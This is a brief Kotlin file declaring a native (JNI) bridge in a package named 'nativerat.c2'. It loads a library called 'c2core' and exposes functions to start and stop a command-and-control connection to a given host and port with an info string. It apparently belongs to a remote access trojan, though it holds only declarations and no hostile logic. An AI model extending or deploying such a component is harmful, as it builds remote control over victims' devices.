package com.nativerat.c2

object NativeBridge {
    init { System.loadLibrary("c2core") }

    external fun startC2(host: String, port: Int, info: String): Int
    external fun stopC2(): Int
    external fun runSelfTest(): String
}